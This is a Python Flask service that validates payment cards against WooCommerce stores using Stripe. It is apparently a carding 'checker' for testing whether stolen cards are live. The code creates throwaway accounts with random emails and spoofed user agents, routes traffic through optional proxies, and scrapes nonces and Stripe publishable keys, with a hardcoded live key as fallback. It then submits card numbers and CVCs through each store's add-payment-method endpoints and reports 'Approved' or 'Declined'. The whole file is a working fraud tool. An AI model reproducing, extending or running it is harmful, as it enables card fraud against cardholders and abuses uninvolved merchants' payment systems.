import sys
import os
import re
import json
import random
import base64
import asyncio
import uuid
import warnings
from datetime import datetime
from urllib.parse import urlparse

import aiohttp
from fake_useragent import UserAgent
from flask import Flask, request, jsonify

# Disable SSL warnings
warnings.filterwarnings("ignore")

# ---------- Original helpers (no UI) ----------
_0x4f2b = base64.b64decode('QG11bWlydV9icm8=').decode()

def log(msg):
    sys.stderr.write(f"{str(msg)}\n")

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except (ValueError, AttributeError):
        return None

def parse_card_data(card_string):
    try:
        card_string = card_string.replace(' ', '')
        if '|' in card_string:
            parts = card_string.split('|')
            if len(parts) >= 4:
                return {
                    'number': parts[0],
                    'exp_month': parts[1],
                    'exp_year': parts[2][-2:] if len(parts[2]) == 4 else parts[2],
                    'cvc': parts[3].strip()
                }
        return None
    except:
        return None

def generate_random_email():
    import string
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def normalize_url(url):
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    url = url.rstrip('/')
    if '/my-account' not in url.lower():
        url += '/my-account'
    if not url.endswith('/'):
        url += '/'
    return url

def generate_guid():
    return str(uuid.uuid4())

async def process_stripe_card(base_url, card_data, proxy_url=None, auth_mode=1, shared_email=None, shared_password=None):
    """
    Stripe card validation logic - now returns (success, message, details)
    where details contains original Stripe responses.
    """
    ua = UserAgent()
    details = {
        'stripe_payment_method_response': None,
        'stripe_confirmation_response': None,
        'used_endpoint': None
    }
    try:
        if not base_url.startswith('http'):
            base_url = 'https://' + base_url

        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)

        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            parsed = urlparse(base_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            email = generate_random_email()

            # Authentication mode 1 (register) or 2 (login) - same as original
            if auth_mode == 1:
                log("Mode 1: Registering new account")
                headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9', 'user-agent': ua.random}
                resp = await session.get(base_url, headers=headers, proxy=proxy_url)
                resp_text = await resp.text()

                register_nonce = (
                    gets(resp_text, 'woocommerce-register-nonce" value="', '"') or
                    gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or
                    gets(resp_text, 'name="woocommerce-register-nonce" value="', '"')
                )

                if register_nonce:
                    username = email.split('@')[0]
                    password = f"Pass{random.randint(100000, 999999)}!"
                    register_data = {
                        'email': email,
                        'wc_order_attribution_source_type': 'typein',
                        'wc_order_attribution_referrer': '(none)',
                        'wc_order_attribution_utm_campaign': '(none)',
                        'wc_order_attribution_utm_source': '(direct)',
                        'wc_order_attribution_utm_medium': '(none)',
                        'wc_order_attribution_utm_content': '(none)',
                        'wc_order_attribution_utm_id': '(none)',
                        'wc_order_attribution_utm_term': '(none)',
                        'wc_order_attribution_utm_source_platform': '(none)',
                        'wc_order_attribution_utm_creative_format': '(none)',
                        'wc_order_attribution_utm_marketing_tactic': '(none)',
                        'wc_order_attribution_session_entry': base_url,
                        'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'wc_order_attribution_session_pages': '1',
                        'wc_order_attribution_session_count': '1',
                        'wc_order_attribution_user_agent': headers['user-agent'],
                        'woocommerce-register-nonce': register_nonce,
                        '_wp_http_referer': '/my-account/',
                        'register': 'Register',
                    }
                    reg_resp = await session.post(base_url, headers=headers, data=register_data, proxy=proxy_url)
                    reg_text = await reg_resp.text()
                    if 'customer-logout' not in reg_text and 'dashboard' not in reg_text.lower():
                        resp = await session.get(base_url, headers=headers, proxy=proxy_url)
                        resp_text = await resp.text()
                        login_nonce = gets(resp_text, 'woocommerce-login-nonce" value="', '"')
                        if login_nonce:
                            login_data = {'username': username, 'password': password, 'woocommerce-login-nonce': login_nonce, 'login': 'Log in'}
                            await session.post(base_url, headers=headers, data=login_data, proxy=proxy_url)

            elif auth_mode == 2 and shared_email and shared_password:
                log("Mode 2: Logging in")
                headers = {'user-agent': ua.random}
                resp = await session.get(base_url, headers=headers, proxy=proxy_url)
                resp_text = await resp.text()
                login_nonce = gets(resp_text, 'woocommerce-login-nonce" value="', '"')
                if login_nonce:
                    login_data = {'username': shared_email, 'password': shared_password, 'woocommerce-login-nonce': login_nonce, 'login': 'Log in'}
                    await session.post(base_url, headers=headers, data=login_data, proxy=proxy_url)

            # ----- Get add-payment-method page -----
            add_payment_url = base_url.rstrip('/') + '/add-payment-method/'
            if '/my-account/add-payment-method' not in add_payment_url:
                add_payment_url = f"{domain}/my-account/add-payment-method/"

            headers = {'user-agent': ua.random}
            resp = await session.get(add_payment_url, headers=headers, proxy=proxy_url)
            payment_page_text = await resp.text()

            add_card_nonce = (
                gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or
                gets(payment_page_text, 'add_card_nonce":"', '"') or
                gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or
                gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"')
            )

            stripe_key = (
                gets(payment_page_text, '"key":"pk_', '"') or
                gets(payment_page_text, 'data-key="pk_', '"') or
                gets(payment_page_text, 'stripe_key":"pk_', '"') or
                gets(payment_page_text, 'publishable_key":"pk_', '"')
            )
            if not stripe_key:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                if pk_match:
                    stripe_key = pk_match.group(0)
            if not stripe_key:
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
            elif not stripe_key.startswith('pk_'):
                stripe_key = 'pk_' + stripe_key

            # ----- Create Payment Method via Stripe API -----
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua.random
            }
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': 'AU',
                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
                'referrer': domain,
                'client_attribution_metadata[client_session_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': generate_guid(), 'muid': generate_guid(), 'sid': generate_guid(),
                'key': stripe_key,
                '_stripe_version': '2024-06-20',
            }

            log("Creating Payment Method...")
            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url)
            pm_json = await pm_resp.json()
            details['stripe_payment_method_response'] = pm_json  # Store original response

            if 'error' in pm_json:
                return False, pm_json['error']['message'], details
            pm_id = pm_json.get('id')
            if not pm_id:
                return False, "Failed to create Payment Method", details

            # ----- Confirm Setup Intent on site -----
            confirm_headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain,
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua.random
            }

            endpoints = [
                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}},
            ]

            for endp in endpoints:
                if not add_card_nonce:
                    continue
                if 'add_payment_method' in endp['url']:
                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
                else:
                    endp['data']['_ajax_nonce'] = add_card_nonce
                endp['data']['wc-stripe-payment-type'] = 'card'

                log(f"Confirming on {endp['url']}...")
                try:
                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers, proxy=proxy_url)
                    text = await res.text()
                    details['used_endpoint'] = endp['url']
                    # Try to parse JSON, but keep raw text if not JSON
                    try:
                        details['stripe_confirmation_response'] = json.loads(text)
                    except:
                        details['stripe_confirmation_response'] = text

                    if 'success' in text:
                        js = json.loads(text)
                        branding = f" [Verified by {_0x4f2b}]"
                        if js.get('success'):
                            status = js.get('data', {}).get('status')
                            if status == 'succeeded':
                                return True, f"Approved (Status: succeeded){branding}", details
                            return True, f"Approved (Status: {status}){branding}", details
                        else:
                            error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                            return False, f"{error_msg}{branding}", details
                except Exception as e:
                    details['stripe_confirmation_response'] = {'error': str(e)}
                    continue

            return False, "Failed to confirm payment method on site", details

    except Exception as e:
        details['exception'] = str(e)
        return False, f"System Error: {str(e)}", details

# ---------- Flask API ----------
app = Flask(__name__)

def run_async(coro):
    """Safely run async coroutine in Flask (new event loop)"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

@app.route('/', methods=['GET'])
def check_card():
    # 1. Validate required parameters
    site = request.args.get('site')
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')  # optional

    if not site or not cc:
        return jsonify({
            'error': 'Missing parameters',
            'required': 'site, cc',
            'optional': 'proxy',
            'example': '/?site=https://example.com&cc=4111111111111111|12|28|123&proxy=http://proxy:8080'
        }), 400

    # 2. Normalize site URL
    try:
        site_url = normalize_url(site)
    except Exception as e:
        return jsonify({'error': f'Invalid site URL: {str(e)}'}), 400

    # 3. Parse card data
    card_data = parse_card_data(cc)
    if not card_data:
        return jsonify({'error': 'Invalid card format. Use NUM|MM|YY|CVV'}), 400

    # 4. Run Stripe check
    try:
        success, message, details = run_async(process_stripe_card(site_url, card_data, proxy, auth_mode=1))
    except Exception as e:
        return jsonify({'error': f'Internal processing error: {str(e)}'}), 500

    # 5. Return JSON response with original Stripe responses
    response = {
        'success': success,
        'message': message,
        'card': cc,
        'site': site_url,
        'stripe_responses': details  # contains payment_method and confirmation responses
    }
    if proxy:
        response['proxy'] = proxy

    return jsonify(response), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
